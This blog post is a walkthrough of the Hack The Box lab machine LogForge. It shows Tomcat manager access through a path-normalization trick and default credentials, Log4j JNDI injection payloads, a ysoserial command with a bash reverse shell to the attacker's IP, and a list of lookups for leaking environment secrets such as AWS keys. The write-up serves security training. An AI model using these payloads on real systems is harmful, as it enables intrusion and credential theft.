<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="LogForge" /><meta name="author" content="kill5witch" /><meta property="og:locale" content="en" /><meta name="description" content="LogForge is Linux box which introduces Log4j Vulnerability. Enumeration NMAP 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 luka@kali:~/htb/logforge/nmap$ nmap -sC -sV -oA nmap 10.10.11.138 Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-24 20:55 CET Nmap scan report for 10.10.11.138 Host is up (0.033s latency). Not shown: 996 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp filtered ftp 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA) | 256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA) |_ 256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Ultimate Hacking Championship |_http-server-header: Apache/2.4.41 (Ubuntu) 8080/tcp filtered http-proxy Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel" /><meta property="og:description" content="LogForge is Linux box which introduces Log4j Vulnerability. Enumeration NMAP 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 luka@kali:~/htb/logforge/nmap$ nmap -sC -sV -oA nmap 10.10.11.138 Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-24 20:55 CET Nmap scan report for 10.10.11.138 Host is up (0.033s latency). Not shown: 996 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp filtered ftp 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA) | 256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA) |_ 256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Ultimate Hacking Championship |_http-server-header: Apache/2.4.41 (Ubuntu) 8080/tcp filtered http-proxy Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel" /><link rel="canonical" href="https://an9k0r.github.io/posts/LogForge/" /><meta property="og:url" content="https://an9k0r.github.io/posts/LogForge/" /><meta property="og:site_name" content="CyberSec-Research.Space" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-12-25T10:33:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="LogForge" /><meta name="twitter:site" content="@cybersec_space" /><meta name="twitter:creator" content="@kill5witch" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"kill5witch"},"description":"LogForge is Linux box which introduces Log4j Vulnerability. Enumeration NMAP 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 luka@kali:~/htb/logforge/nmap$ nmap -sC -sV -oA nmap 10.10.11.138 Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-24 20:55 CET Nmap scan report for 10.10.11.138 Host is up (0.033s latency). Not shown: 996 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp filtered ftp 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA) | 256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA) |_ 256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Ultimate Hacking Championship |_http-server-header: Apache/2.4.41 (Ubuntu) 8080/tcp filtered http-proxy Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel","headline":"LogForge","dateModified":"2022-03-04T15:15:09+01:00","url":"https://an9k0r.github.io/posts/LogForge/","datePublished":"2021-12-25T10:33:00+01:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://an9k0r.github.io/posts/LogForge/"},"@context":"https://schema.org"}</script><title>LogForge | CyberSec-Research.Space</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="CyberSec-Research.Space"><meta name="application-name" content="CyberSec-Research.Space"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/images/logo.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">CyberSec-Research.Space</a></div><div class="site-subtitle font-italic">Information Security Personal Blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blogging/" class="nav-link"> <i class="fa-fw fas fa-book ml-xl-3 mr-xl-3 unloaded"></i> <span>BLOGS AND GUIDES</span> </a><li class="nav-item"> <a href="/hack_the_box/" class="nav-link"> <i class="fa-fw fas fa-bug ml-xl-3 mr-xl-3 unloaded"></i> <span>HACK THE BOX</span> </a><li class="nav-item"> <a href="/blue_team_ctf/" class="nav-link"> <i class="fa-fw fas fa-anchor ml-xl-3 mr-xl-3 unloaded"></i> <span>BLUE TEAM CTFS</span> </a><li class="nav-item"> <a href="/web_application/" class="nav-link"> <i class="fa-fw fas fa-terminal ml-xl-3 mr-xl-3 unloaded"></i> <span>WEB APPLICATION</span> </a><li class="nav-item"> <a href="/binary_exploitation/" class="nav-link"> <i class="fa-fw fas fa-microchip ml-xl-3 mr-xl-3 unloaded"></i> <span>BINARY EXPLOITATION</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/an9k0r" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/cybersec_space" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>LogForge</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 694 515'%3E%3C/svg%3E" data-src="/assets/images/2022-01-12-10-53-32.png" class="preview-img bg" alt="image alternative text" width="694" height="515" data-proofer-ignore><h1 data-toc-skip>LogForge</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/an9k0r">kill5witch</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2021-12-25 10:33:00 +0100" data-toggle="tooltip" data-placement="bottom" title="Sat, Dec 25, 2021, 10:33 AM +0100" >Dec 25, 2021</em> </span> <span> Updated <em class="timeago" date="2022-03-04 15:15:09 +0100 " data-toggle="tooltip" data-placement="bottom" title="Fri, Mar 4, 2022, 3:15 PM +0100" >Mar 4, 2022</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="827 words"> <em>4 min</em> read</span></div></div></div><div class="post-content"><p><strong>LogForge is Linux box which introduces Log4j Vulnerability.</strong></p><h1 id="enumeration">Enumeration</h1><h2 id="nmap">NMAP<a href="#nmap" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>luka@kali:~/htb/logforge/nmap$ nmap -sC -sV -oA nmap 10.10.11.138
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-24 20:55 CET
Nmap scan report for 10.10.11.138
Host is up (0.033s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE    SERVICE    VERSION
21/tcp   filtered ftp
22/tcp   open     ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
80/tcp   open     http       Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Ultimate Hacking Championship
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp filtered http-proxy
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><h2 id="webpage-on-port-80">WebPage on Port 80<a href="#webpage-on-port-80" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="/assets/images/2022-01-11-19-22-43.png" alt="" data-proofer-ignore></p><p>Going to page that doesn’t exist shows, that there is difference regarding which server is running on port 80 (Apache or Apache Tomcat), which makes us asume that we’re dealing with reverse proxy. <img data-src="/assets/images/2022-01-11-19-24-26.png" alt="" data-proofer-ignore></p><h1 id="exploitation">Exploitation</h1><p>So from very basic enumeration let’s start to exploitation. First on the menu is breaking the parser logic.</p><h2 id="breaking-parser-logic-on-apache--tomcat">Breaking parser logic on Apache / Tomcat<a href="#breaking-parser-logic-on-apache--tomcat" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf</p><p>We’ll use a neat trick to trick Reverse Proxy to not block us after opening <code class="language-plaintext highlighter-rouge">/manager/</code>. <img data-src="/assets/images/2022-01-11-19-25-22.png" alt="" data-proofer-ignore> We’ll be able to bypass that and still end on Tomcat because tomcat doesn’t treat that ::; as URL. <code class="language-plaintext highlighter-rouge">http://10.10.11.138/idontexist/..;/manager/</code> will open the Login prompt (Login with <code class="language-plaintext highlighter-rouge">tomcat/tomcat</code>). We should be able to login to Tomcat manager. <img data-src="/assets/images/2022-01-11-19-25-42.png" alt="" data-proofer-ignore></p><h2 id="log4j-exploit--cve-202144882">Log4J Exploit / CVE-2021/44882<a href="#log4j-exploit--cve-202144882" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>There are a lot of good explanations on Log4J, so i’ll won’t be diving into that. I’ve done the PoC before which used simple JNDI payload, which loaded malicious class after LDAP Callback and gave reverse shell.</p><p>Exploiting Log4J on this box is a little more tricky. First of all, we need to get an execution, so let’s try injecting simple payload into Tomcat. <code class="language-plaintext highlighter-rouge">${jndi:ldap://10.10.14.18:1389/Ajej.class}</code> <img data-src="/assets/images/2022-01-11-19-25-57.png" alt="" data-proofer-ignore> I ran <code class="language-plaintext highlighter-rouge">tcpdump</code> but nc listening on port 1389 would also do the job. There’s callback so Application is vulnerable. <img data-src="/assets/images/2022-01-11-19-26-11.png" alt="" data-proofer-ignore> Like suggested in the ippsec’s video https://www.youtube.com/watch?v=XG14EstTgQ4, approach mention in the post https://twitter.com/marcioalm/status/1470361495405875200 will be used. In addition to that post, we’ll not be using the regular Ysoserial, but Ysoserial-modified: https://github.com/pimps/ysoserial-modified JNDI-Exploit-kit: https://github.com/pimps/JNDI-Exploit-Kit.git</p><h3 id="creating-payload">Creating payload<a href="#creating-payload" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i &gt;&amp; /dev/tcp/10.10.14.18/4444 0&gt;&amp;1' &gt; /home/luka/htb/logforge/rev
</pre></table></code></div></div><h3 id="starting-jndi-exploit-kit">Starting JNDI-Exploit-Kit<a href="#starting-jndi-exploit-kit" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>java -jar target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.18:1389 -P /home/luka/htb/logforge/rev
</pre></table></code></div></div><p><img data-src="/assets/images/2022-01-11-19-26-30.png" alt="" data-proofer-ignore></p><h3 id="reverse-shell">Reverse Shell<a href="#reverse-shell" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>Put <code class="language-plaintext highlighter-rouge">${jndi:ldap://10.10.14.18:1389/rev}</code> again in the manager’s field which gives us RCE and start it. Reverse shell should pop: <img data-src="/assets/images/2022-01-11-19-26-44.png" alt="" data-proofer-ignore> If the payload wouldn’t work, we could use also one of the following:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>----------------------------JNDI Links---------------------------- 
Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
rmi://10.10.14.18:1099/s5ie1k
ldap://10.10.14.18:1389/s5ie1k
Target environment(Build in JDK 1.5 whose trustURLCodebase is true):
rmi://10.10.14.18:1099/kfaicp
ldap://10.10.14.18:1389/kfaicp
Target environment(Build in JDK - (BYPASS WITH GROOVY by @orangetw) whose trustURLCodebase is false and have Tomcat 8+ and Groovy in classpath):
rmi://10.10.14.18:1099/koifwi
Target environment(Build in JDK 1.6 whose trustURLCodebase is true):
rmi://10.10.14.18:1099/2blnim
ldap://10.10.14.18:1389/2blnim
Target environment(Build in JDK 1.7 whose trustURLCodebase is true):
rmi://10.10.14.18:1099/e6xn7g
ldap://10.10.14.18:1389/e6xn7g
Target environment(Build in JDK - (BYPASS WITH EL by @welk1n) whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):
rmi://10.10.14.18:1099/urpkwl
</pre></table></code></div></div><h1 id="privilege-escalation">Privilege Escalation</h1><h2 id="ftp-server-java-running-as-root">FTP Server (Java) running as root<a href="#ftp-server-java-running-as-root" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>root         769       1  0 Dec24 ?        00:00:00 /usr/sbin/cron -f
root         937     769  0 Dec24 ?        00:00:00  \_ /usr/sbin/CRON -f
root         943     937  0 Dec24 ?        00:00:00      \_ /bin/sh -c /root/run.sh
root         944     943  0 Dec24 ?        00:00:00          \_ /bin/bash /root/run.sh
root         945     944  0 Dec24 ?        00:00:59              \_ java -jar /root/ftpServer-1.0-SNAPSHOT-all.jar
</pre></table></code></div></div><p><img data-src="/assets/images/2022-01-11-19-27-09.png" alt="" data-proofer-ignore> Unintended way to solve the box is to log into FTP on localhost with any user, and simple use dir and cat to read the flag etc.</p><p>Intended way (according to IppSec’s video) is to exploit the vulnerable Log4J FTP Application. We can exploit Log4J simply by putting same string as we did above into the username, and we’d get a callback from an application. Because this app does not have any gadgets, we need to dig deeper into the application. So download the ftp server application to Kali and open it with <code class="language-plaintext highlighter-rouge">jd-gui</code>.</p><p>You should see Log4J decompiled classes right away. In <code class="language-plaintext highlighter-rouge">Worker.class</code> we can see user and the pass which will be passed from environment variable.</p><div class="language-java highlighter-rouge"><div class="code-header"> <span label-text="Java"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>  <span class="kd">private</span> <span class="nc">String</span> <span class="n">validUser</span> <span class="o">=</span> <span class="nc">System</span><span class="o">.</span><span class="na">getenv</span><span class="o">(</span><span class="s">"ftp_user"</span><span class="o">);</span>
  
  <span class="kd">private</span> <span class="nc">String</span> <span class="n">validPassword</span> <span class="o">=</span> <span class="nc">System</span><span class="o">.</span><span class="na">getenv</span><span class="o">(</span><span class="s">"ftp_password"</span><span class="o">);</span>
</pre></table></code></div></div><p>Both can be read using JNDI, so let’s try that. <code class="language-plaintext highlighter-rouge">${jndi:ldap://10.10.14.18:1389/${env:ftp_user}/${env:ftp_password}}</code></p><p>Run <code class="language-plaintext highlighter-rouge">tcpdump -i tun0 -A port 1389</code> Somewhere in the middle we should find, leaked username and password: <img data-src="/assets/images/2022-01-11-19-28-27.png" alt="" data-proofer-ignore> FTP Login should work. We can either grab a flag only or download <code class="language-plaintext highlighter-rouge">.ssh/id_rsa</code></p><h3 id="exflitration-of-other-data">Exflitration of other Data<a href="#exflitration-of-other-data" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>Exfiltration of other data is also possible. This is short list from here: https://therceman.medium.com/log4j-vulnerability-cheatsheet-66b7aeabc607</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>${hostName}  
${sys:user.name}  
${sys:user.home}  
${sys:user.dir}  
${sys:java.home}  
${sys:java.vendor}  
${sys:java.version}  
${sys:java.vendor.url}  
${sys:java.vm.version}  
${sys:java.vm.vendor}  
${sys:java.vm.name}  
${sys:os.name}  
${sys:os.arch}  
${sys:os.version}  
${env:JAVA_VERSION}  
${env:AWS_SECRET_ACCESS_KEY}  
${env:AWS_SESSION_TOKEN}  
${env:AWS_SHARED_CREDENTIALS_FILE}  
${env:AWS_WEB_IDENTITY_TOKEN_FILE}  
${env:AWS_PROFILE}  
${env:AWS_CONFIG_FILE}  
${env:AWS_ACCESS_KEY_ID}
</pre></table></code></div></div><p>For example: <code class="language-plaintext highlighter-rouge">${jndi:ldap://10.10.14.18:1389/${hostName}/......./${sys:user.name} /......./${sys:user.dir}/......./${sys:os.version}}</code> <img data-src="/assets/images/2022-01-11-19-28-42.png" alt="" data-proofer-ignore></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/linux/'>Linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/web-application/" class="post-tag no-text-decoration" >Web Application</a> <a href="/tags/log4j/" class="post-tag no-text-decoration" >Log4j</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >Linux</a> <a href="/tags/nginx/" class="post-tag no-text-decoration" >Nginx</a> <a href="/tags/path-normalization/" class="post-tag no-text-decoration" >Path Normalization</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=LogForge - CyberSec-Research.Space&url=https://an9k0r.github.io/posts/LogForge/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=LogForge - CyberSec-Research.Space&u=https://an9k0r.github.io/posts/LogForge/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=LogForge - CyberSec-Research.Space&url=https://an9k0r.github.io/posts/LogForge/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/insecure_deserialization/">(Portswigger/WebAcademy) - Insecure Deserialization vulnerabilities</a><li><a href="/posts/ssti/">(Portswigger/WebAcademy) - Server-Side Template Injection vulnerabilities</a><li><a href="/posts/stored_XSS/">(Portswigger/WebAcademy) - Stored Cross-Site Scripting (XSS)</a><li><a href="/posts/Blind_SQL_Injection/">Blind SQL Injection</a><li><a href="/posts/OS_Command_Injection/">OS Command Injection</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/portswigger/">Portswigger</a> <a class="post-tag" href="/tags/web-application/">Web Application</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/clear-text-credentials/">Clear Text Credentials</a> <a class="post-tag" href="/tags/password-reuse/">Password Reuse</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/deserialization/">Deserialization</a> <a class="post-tag" href="/tags/misconfiguration/">Misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Doctor/"><div class="card-body"> <em class="timeago small" date="2021-01-11 10:33:00 +0100" >Jan 11, 2021</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Doctor</h3><div class="text-muted small"><p> Doctor is an easy linux box where we need to exploit WebApp using Command Injection, Path Traversal ENUMERATION NMAP Nmap scan report for 10.10.10.209 Host is up (0.040s latency). Not shown: 997 f...</p></div></div></a></div><div class="card"> <a href="/posts/Jewel/"><div class="card-body"> <em class="timeago small" date="2021-01-11 10:33:00 +0100" >Jan 11, 2021</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Jewel</h3><div class="text-muted small"><p> Jewel is a medium Windows box. It’s main part is Source Code Review. ENUMERATION NMAP Let’s start NMAP: Nmap scan report for 10.10.10.211 Host is up (0.040s latency). Not shown: 997 filtere...</p></div></div></a></div><div class="card"> <a href="/posts/Bitlab/"><div class="card-body"> <em class="timeago small" date="2021-12-25 10:33:00 +0100" >Dec 25, 2021</em><h3 class="pt-0 mt-1 mb-3" 